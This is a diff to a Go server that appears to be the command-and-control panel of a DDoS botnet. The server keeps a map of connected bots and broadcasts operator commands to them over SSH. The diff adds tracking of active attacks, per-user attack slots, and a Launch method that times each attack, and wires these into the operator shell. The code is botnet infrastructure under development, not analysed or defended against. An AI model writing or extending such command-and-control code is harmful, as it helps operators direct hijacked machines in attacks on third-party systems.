@@ -24,9 +24,11 @@ type Server struct {
 	theme  prompt.Theme
 	sshCfg *ssh.ServerConfig
 
-	mu   sync.Mutex
-	bots  map[string]shell.Bot
-	conns map[string]net.Conn
+	mu            sync.Mutex
+	bots          map[string]shell.Bot
+	conns         map[string]net.Conn
+	activeAttacks int
+	totalSlots    int
 }
 
 func New(cfg *config.Config) (*Server, error) {
@@ -41,11 +43,12 @@ func New(cfg *config.Config) (*Server, error) {
 	}
 
 	s := &Server{
-		cfg:   cfg,
-		users: users,
-		theme: prompt.DefaultTheme,
-		bots:  map[string]shell.Bot{},
-		conns: map[string]net.Conn{},
+		cfg:        cfg,
+		users:      users,
+		theme:      prompt.DefaultTheme,
+		bots:       map[string]shell.Bot{},
+		conns:      map[string]net.Conn{},
+		totalSlots: users.Slots(),
 	}
 
 	s.sshCfg = &ssh.ServerConfig{
@@ -103,6 +106,31 @@ func (s *Server) Broadcast(cmd string) int {
 		n++
 	}
 	return n
+}
+
+func (s *Server) Launch(dur int) {
+	s.mu.Lock()
+	s.activeAttacks++
+	s.mu.Unlock()
+	time.AfterFunc(time.Duration(dur)*time.Second, func() {
+		s.mu.Lock()
+		if s.activeAttacks > 0 {
+			s.activeAttacks--
+		}
+		s.mu.Unlock()
+	})
+}
+
+func (s *Server) Attacks() int {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	return s.activeAttacks
+}
+
+func (s *Server) TotalSlots() int {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+	return s.totalSlots
 }
 
 func (s *Server) handleTCP(conn net.Conn) {
@@ -207,7 +235,7 @@ func (s *Server) handleSSH(nConn net.Conn) {
 			continue
 		}
 
-		sess := shell.New(channel, s.theme, user, s.cfg.Hostname, s.Bots, s.Broadcast)
+		sess := shell.New(channel, s.theme, user, s.cfg.Hostname, s.Bots, s.Broadcast, s.Attacks, s.TotalSlots, s.Launch)
 
 		go func(in <-chan *ssh.Request) {
 			for req := range in {
